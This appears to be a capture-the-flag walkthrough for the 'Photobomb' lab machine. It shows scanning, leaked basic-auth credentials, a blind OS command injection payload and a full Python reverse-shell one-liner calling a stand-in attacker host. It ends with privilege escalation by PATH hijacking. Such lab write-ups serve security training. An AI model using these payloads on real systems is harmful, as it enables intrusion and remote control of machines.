# Machine Information
This machine is from easy level worth 20 points.

IP: `10.10.11.182`

# Scanning and Enumeration
First thing add ip to `/etc/hosts` file to allow any dns records.

```bash
nano /etc/hosts
```
Use `nano` to open this file and put ip.

Naturally, we will use `nmap` to identify open ports and collect some information about that machine.

```bash
nmap -A -T5 -p- 10.10.11.182

After scanning, I found ports 22 and 80 open, so I'll go to Website and dig deeper.

When you press on `Click here`, a window pops up asking you to enter your username and password.

I'm trying to bypass that popup with basic auth techniques like sql injection, default credentials (admin: admin), nosql, etc.. but all of them didn't work.

After that, I thought that I would see a source code, and I actually found the credentials.

Use this credentials `pH0t0:b0Mb!` to bypass that popup.

After logging in, I only found a download function, and now I'm going to test it.

![image](/assets/img/htb/photobomb/download.png)

Capture the request by burp, Send to repeater and Play in parameters.

The first thing that came to my mind after seeing a request is to try to test the `OS Command Injection` vulnerability in all parameters to find out which parameter is at vulnerable.

The vulnerable parameter is the file type you specified with that payload `; ping -c 10 10.10.11.182` and the result was waiting for the response for about 10 millis to know that this parameter was vulnerable to a `blind OS Command Injection` vulnerability.

I've tried using a number of characters as command separators like `| , || , &` , but only those that have succeeded `;` .

![image](/assets/img/htb/photobomb/burp.png)

Use command injection to get reverse shell.

I tried several payloads but only the [python-reverse-shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/) worked.

```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Put that payload in that vulnerable parameter.

Listen by netcat.

Bingoo, I got the user flag.

# Privilege Escalation

Use `sudo -l` this option will print out the commands allowed (and forbidden) the user on the current host. 

![image](/assets/img/htb/photobomb/sudo.png)

This shows the current user can use this script `/opt/cleanup.sh` as root.

See the script to exploit it.

![image](/assets/img/htb/photobomb/script.png)

 The last line of the above script it is finding the filetype and it is executing it with root permission.
 
 To exploit it do that call the `find` binary using this relative path instead of the absolute path. By creating a malicious `find`, and modifying the path to include the current working directory, I should be able to abuse this misconfiguration, and escalate our privileges to root.
 
And that is known as a name [PATH-Variable-manipulation](https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469).

Add the current working directory to PATH.

![image](/assets/img/htb/photobomb/path.png)

Create the malicious `find` binary and make it executable.

![image](/assets/img/htb/photobomb/find.png)

Now, Run the script `/opt/cleanup.sh`. 

Great, I become root.

Bingoo, I got the root flag.
